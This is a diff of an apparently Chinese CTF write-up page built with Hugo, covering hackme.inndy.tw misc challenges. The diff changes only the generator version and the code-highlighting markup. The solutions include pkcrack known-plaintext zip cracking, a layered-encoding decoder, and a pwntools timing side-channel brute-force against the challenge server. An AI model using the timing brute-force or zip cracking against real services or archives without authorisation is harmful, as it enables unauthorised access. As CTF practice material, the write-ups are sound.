@@ -25,7 +25,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.92.0 with theme even" />
+<meta name="generator" content="Hugo 0.95.0 with theme even" />
 
 
 <link rel="preload" href="/fonts/iconfont/iconfont.woff" as="font" type="font/woff" crossorigin="anonymous">
@@ -288,11 +288,11 @@ decode 之, 得到字符串 <code>Did you tried LSB?</code></p>
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">zip plain.zip ../png/00000000.png
-pkcrack -C 00000094.zip -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P plain.zip -p 00000000.png -d flag.zip -a
-x flag.zip
-cat flag/meow/flag
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip plain.zip ../png/00000000.png
+</span></span><span class="line"><span class="cl">pkcrack -C 00000094.zip -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P plain.zip -p 00000000.png -d flag.zip -a
+</span></span><span class="line"><span class="cl">x flag.zip
+</span></span><span class="line"><span class="cl">cat flag/meow/flag
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="where-is-flag">where is flag</h2>
 <blockquote>
@@ -343,37 +343,37 @@ cat flag/meow/flag
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-
-<span class="kn">import</span> <span class="nn">random</span>
-<span class="kn">import</span> <span class="nn">string</span>
-
-<span class="k">def</span> <span class="nf">rot13</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span>
-        <span class="n">string</span><span class="o">.</span><span class="n">uppercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">uppercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span>
-        <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">]))</span>
-
-<span class="k">def</span> <span class="nf">base64</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
-
-<span class="k">def</span> <span class="nf">hex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">upsidedown</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span>
-        <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">uppercase</span><span class="p">))</span>
-
-<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;FLAG{.....................}&#39;</span>  <span class="c1"># try to recover flag</span>
-
-<span class="n">E</span> <span class="o">=</span> <span class="p">(</span><span class="n">rot13</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="nb">hex</span><span class="p">,</span> <span class="n">upsidedown</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">50</span><span class="p">)):</span>
-    <span class="nb">print</span> <span class="n">i</span>
-    <span class="n">c</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%d%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">E</span><span class="p">[</span><span class="n">c</span><span class="p">](</span><span class="n">flag</span><span class="p">))</span>
-
-<span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rot13</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span><span class="o">.</span><span class="n">uppercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">uppercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base64</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upsidedown</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">uppercase</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;FLAG{.....................}&#39;</span>  <span class="c1"># try to recover flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">E</span> <span class="o">=</span> <span class="p">(</span><span class="n">rot13</span><span class="p">,</span> <span class="n">base64</span><span class="p">,</span> <span class="nb">hex</span><span class="p">,</span> <span class="n">upsidedown</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">50</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%d%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">E</span><span class="p">[</span><span class="n">c</span><span class="p">](</span><span class="n">flag</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>不过虽然看上去挺难, 但仔细点就会发现 c 的值就在密文开头</p>
 <div class="highlight"><div class="chroma">
@@ -410,37 +410,37 @@ cat flag/meow/flag
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
-<span class="kn">import</span> <span class="nn">string</span>
-
-<span class="k">def</span> <span class="nf">unrot13</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-     <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span>
-                                         <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">],</span>
-                                         <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">))</span>
-
-<span class="k">def</span> <span class="nf">unupsidedown</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-     <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">,</span>
-                                         <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">))</span>
-
-<span class="k">def</span> <span class="nf">unbase64</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-
-<span class="k">def</span> <span class="nf">unhex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./flag.enc&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-
-<span class="n">E</span> <span class="o">=</span> <span class="p">(</span><span class="n">unrot13</span><span class="p">,</span> <span class="n">unbase64</span><span class="p">,</span> <span class="n">unhex</span><span class="p">,</span> <span class="n">unupsidedown</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
-    <span class="n">c</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">E</span><span class="p">[</span><span class="n">c</span><span class="p">](</span><span class="n">data</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">):</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-        <span class="k">break</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unrot13</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">[</span><span class="mi">13</span><span class="p">:]</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">[:</span><span class="mi">13</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unupsidedown</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unbase64</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unhex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./flag.enc&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">E</span> <span class="o">=</span> <span class="p">(</span><span class="n">unrot13</span><span class="p">,</span> <span class="n">unbase64</span><span class="p">,</span> <span class="n">unhex</span><span class="p">,</span> <span class="n">unupsidedown</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">E</span><span class="p">[</span><span class="n">c</span><span class="p">](</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="slow">slow</h2>
 <blockquote>
@@ -486,36 +486,36 @@ cat flag/meow/flag
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_uppercase</span><span class="p">,</span> <span class="n">digits</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
-
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
-<span class="kn">from</span> <span class="nn">timeauth</span> <span class="kn">import</span> <span class="n">TimeAuthChecker</span>
-
-<span class="k">class</span> <span class="nc">ExampleChecker</span><span class="p">(</span><span class="n">TimeAuthChecker</span><span class="p">):</span>
-
-    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="nb">super</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="vm">__class__</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span>
-            <span class="n">charset</span><span class="o">=</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span>
-            <span class="n">token_length</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="c1"># 随便猜的长度</span>
-            <span class="n">max_thread</span><span class="o">=</span><span class="mi">19</span>
-        <span class="p">)</span>
-
-    <span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
-        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
-        <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7708</span><span class="p">)</span>
-        <span class="n">base_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;What is your flag?&#39;</span><span class="p">,</span> <span class="s1">&#39;FLAG{&#39;</span> <span class="o">+</span> <span class="n">token</span> <span class="o">+</span> <span class="s1">&#39;}&#39;</span><span class="p">)</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">readall</span><span class="p">()</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-        <span class="k">return</span> <span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">base_time</span>
-
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">a</span> <span class="o">=</span> <span class="n">ExampleChecker</span><span class="p">()</span>
-    <span class="n">a</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
-    <span class="n">a</span><span class="o">.</span><span class="n">print_token</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_uppercase</span><span class="p">,</span> <span class="n">digits</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">remote</span><span class="p">,</span> <span class="n">context</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">timeauth</span> <span class="kn">import</span> <span class="n">TimeAuthChecker</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ExampleChecker</span><span class="p">(</span><span class="n">TimeAuthChecker</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="vm">__class__</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">charset</span><span class="o">=</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token_length</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="c1"># 随便猜的长度</span>
+</span></span><span class="line"><span class="cl">            <span class="n">max_thread</span><span class="o">=</span><span class="mi">19</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7708</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">base_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;What is your flag?&#39;</span><span class="p">,</span> <span class="s1">&#39;FLAG{&#39;</span> <span class="o">+</span> <span class="n">token</span> <span class="o">+</span> <span class="s1">&#39;}&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">readall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">base_time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">ExampleChecker</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span><span class="o">.</span><span class="n">print_token</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><del>(考虑到本咸鱼不知道向后兼容为何物, 这份代码说不定现在已经跑不了了)</del></p>
 <h2 id="pusheentxt">pusheen.txt</h2>
@@ -529,8 +529,8 @@ cat flag/meow/flag
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">grep -oP <span class="s2">&#34;(▄▀▀▒██▒██▒)|(▄▀▀ ██ ██ )&#34;</span> pusheen.txt<span class="p">|</span>xargs <span class="nb">echo</span> -n<span class="p">|</span>sed <span class="s1">&#39;s/▄▀▀▒██▒██▒/1/g;s/▄▀▀ ██ ██/0/g;s/ //g&#39;</span><span class="p">|</span>rax2 -bt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -oP <span class="s2">&#34;(▄▀▀▒██▒██▒)|(▄▀▀ ██ ██ )&#34;</span> pusheen.txt<span class="p">|</span>xargs <span class="nb">echo</span> -n<span class="p">|</span>sed <span class="s1">&#39;s/▄▀▀▒██▒██▒/1/g;s/▄▀▀ ██ ██/0/g;s/ //g&#39;</span><span class="p">|</span>rax2 -bt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="big">big</h2>
 <blockquote>
@@ -547,12 +547,12 @@ cat flag/meow/flag
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">lzma</span>
-
-<span class="n">f</span> <span class="o">=</span> <span class="n">lzma</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;./big.xz&#39;</span><span class="p">)</span>
-<span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#巨慢的 seek()...</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">lzma</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="n">lzma</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;./big.xz&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1">#巨慢的 seek()...</span>
